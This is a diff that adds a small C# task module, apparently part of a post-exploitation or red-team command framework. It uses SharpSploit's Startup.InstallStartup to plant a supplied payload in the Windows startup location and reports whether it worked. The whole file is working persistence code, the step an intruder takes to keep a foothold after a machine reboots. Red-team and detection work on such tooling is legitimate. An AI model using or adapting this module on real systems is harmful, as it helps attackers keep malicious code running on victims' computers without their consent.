@@ -1,0 +1,17 @@
+﻿using System;
+  
+using SharpSploit.Persistence;
+
+public static class Task
+{
+    public static string Execute(string payload, string fileName = "")
+    {
+        try
+        {
+            if (Startup.InstallStartup(payload, fileName))
+                return "Startup Persistence suceeded for: " + fileName;
+            return "Startup Persistence failed for: " + fileName;
+        }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+    }
+}
